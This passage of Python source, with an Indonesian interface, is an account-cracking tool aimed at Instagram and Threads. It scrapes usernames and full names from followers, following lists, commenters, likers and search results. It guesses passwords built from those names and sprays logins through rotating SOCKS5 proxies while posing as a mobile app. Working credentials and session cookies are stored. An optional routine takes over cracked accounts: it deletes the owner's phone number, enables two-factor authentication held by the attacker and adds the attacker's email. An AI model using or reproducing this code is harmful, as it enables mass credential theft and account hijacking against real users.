                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                
        elif query == '07' or query == '7':
            try: Facebook()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
                              
        elif query == '00' or query == '0':
            try: self.Remove_Cookie()
            except (Exception) as e:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
                exit()
        else:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Menu Instagram!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()               
                  
    def Dump_Search(self, username, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={self.username}&rank_token=0.11856792192547738&include_reel=true',headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie':cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(self.username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Search(self.username, cookie)
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass       
            
    def Dump_Followers(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/followers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Followers(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Following(self, username, cookie, max_id):
        with requests.Session() as r:
            try:
                params = {'count': '200','max_id': max_id,'search_surface': 'follow_list_page'}
                response = r.get(f'https://www.instagram.com/api/v1/friendships/{username}/following/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_max_id' in str(response):
                    self.Dump_Following(username, cookie, response['next_max_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Dump_Komentar(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/comments/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['comments']:
                    if akun not in dump:
                        dump.append(akun['user']['username']+'<=>'+akun['user']['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass
            
    def Dump_Likers(self, username, cookie, max_min):
        with requests.Session() as r:
            try:
                params = {'can_support_threading':True,'permalink_enabled':False,'min_id': max_min}
                response = r.get(f'https://www.instagram.com/api/v1/media/{username}/likers/', params = params, headers = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1)}, cookies={'cookie': cookie}).json()
                for akun in response['users']:
                    if akun not in dump:
                        dump.append(akun['username']+'<=>'+akun['full_name'])
                        Console().print(f""[bold grey50]   ╰─>[bold green] Dump @{str(username)[:20]}/{len(dump)} Username...     "", end='\r')
                if 'next_min_id' in str(response):
                    self.Dump_Komentar(username, cookie, response['next_min_id'])
            except (KeyboardInterrupt, requests.exceptions.TooManyRedirects) as e: pass   
            
    def Result(self, result, isi):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f'\r╭ auth secure account',style='green'); true.add(f""status two {buka.split('|')[6]}""); true.add(f""secret key {buka.split('|')[7]}""); true.add(f""pemulihan {buka.split('|')[8]}""); true.add(f""telephone {buka.split('|')[9]}""); true.add(f""add email {buka.split('|')[10]}""); true.add(f""web email {buka.split('|')[11]}""); true = tree.add(f""Cookie {buka.split('|')[12]}""); tree.add(""Success cek in Result OK""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='green'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); true = tree.add(f""Cookie {buka.split('|')[6]}""); tree.add(""Success cek in Result OK""); printz(tree)
                    
        elif result in ('2','02'):
            for buka in open(f'/sdcard/2F/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='red'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in two factor',style='red'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result 2F""); printz(tree)
                
        elif result in ('3','03'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Gagal logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); true = tree.add(f'\r╭ informasi date profiles',style='yellow'); true.add(f""Followerd {buka.split('|')[3]}""); true.add(f""Following {buka.split('|')[4]}""); true.add(f""Postingan {buka.split('|')[5]}""); tree.add(""Success cek in Result CP""); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f""Succes logged {buka.split('|')[0]}""); true.add(f""Username {buka.split('|')[1]}""); true.add(f""Password {buka.split('|')[2]}""); tree.add(""Success cek in Result CP""); printz(tree)   
            
    def Methode(self):
        try:
            self.Meterans.append(Panel(f'[bold green]01.[bold white] Methode [bold green]Api V1\n[bold green]02.[bold white] Methode [bold green]Api Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Api) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50', subtitle = ""╭─────"", subtitle_align = ""left""))
            self.Meterans.append(Panel(f'[bold green]03.[bold white] Methode [bold green]Ajax V1\n[bold green]04.[bold white] Methode [bold green]Ajax Threads', title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Url Ajax) [bold green]<[bold yellow]<[bold red]<',width = 32, style='bold grey50'))
            Console().print(Columns(self.Meterans))
            Methode_Login = Console().input(""[bold grey50]   ╰─> "")
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Apakah Anda Ingin Menggunakan Auto Amankan Data Akun OK (y/t)"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Secure Akun) [bold green]<[bold yellow]<[bold red]<"", subtitle = ""╭─────"", subtitle_align = ""left""))
            Secure_Akun = Console().input(""[bold grey50]   ╰─> "")
            if Secure_Akun =='y' or Secure_Akun =='ya':
                self.amankan_akun.append('ya')
            self.Exec_Methode(Methode_Login)
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()                
        
    def Simpan_Result(self):
        self.waktu = datetime.datetime.now()
        self.bulan = ['Januari', 'Februari', 'Maret', 'April',  'Mei', 'Juni', 'Juli','Agustus', 'September', 'Oktober', 'November', 'Desember']
        return(f'OK-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}', f'2F-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}',f'CP-{self.waktu.day}-{self.bulan[self.waktu.month-1]}-{self.waktu.year}')
        
    def Password(self, fullname):
        self.one = []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
            else: self.one.append(fullname.lower()); self.one.append(fullname.replace(' ','')); self.one.append(nama+'123'); self.one.append(nama+'1234'); self.one.append(nama+'12345')
        
    def Exec_Methode(self, Methode_Login):
        try:
            self.result_ok,self.result_two,self.result_cp = self.Simpan_Result()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[bold green]•[bold white] Result OK Tersimpan Di Folder : [bold green]/sdcard/OK/{self.result_ok}\n[bold red]•[bold white] Result 2F Tersimpan Di Folder : [bold red]/sdcard/2F/{self.result_two}\n[bold green]•[bold white] Result CP Tersimpan Di Folder : [bold yellow]/sdcard/CP/{self.result_cp}"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Result Instagram) [bold green]<[bold yellow]<[bold red]<""))
            Console(width = 65).print(Panel('[bold white]Mainkan Mode Pesawat Setiap 200 Looping Agar Terhindar Spam!',title='[bold red]>[bold yellow]>[bold green]>[bold grey50] (Warning Spam) [bold green]<[bold yellow]<[bold red]<',style='white'))
            with ThreadPoolExecutor(max_workers=30) as V:
                for Username_And_Fullname in dump:
                    username, fullname = Username_And_Fullname.split('<=>')
                    password = self.Password(fullname)
                    if Methode_Login in ('1'):
                        V.submit(self.ExecApi, username,password)
                    elif Methode_Login in ('2'):
                        V.submit(self.ExecApi_Threads, username,password)
                    elif Methode_Login in ('3'):
                        V.submit(self.ExecAjax, username,password)
                    elif Methode_Login in ('4'):
                        V.submit(self.ExecAjax_Threads, username,password)
                    else: V.submit(self.ExecApi, username,password)
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Kamu Telah Mendapatkan [bold green]{self.success}[bold white] Hasil OK, [bold yellow]{self.chekpoint}[bold white] Hasil Checkpoint Dan [bold red]{self.faktor}[bold white] Hasil Two Faktor, Dari {len(dump)} Username!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Selesai) [bold green]<[bold yellow]<[bold red]<""))
            exit()
        except (Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]{str(e).title()}!"", title = ""[bold red]>[bold yellow]>[bold green]>[bold grey50] (Error) [bold green]<[bold yellow]<[bold red]<""))
            exit()  
        
    def ExecApi(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
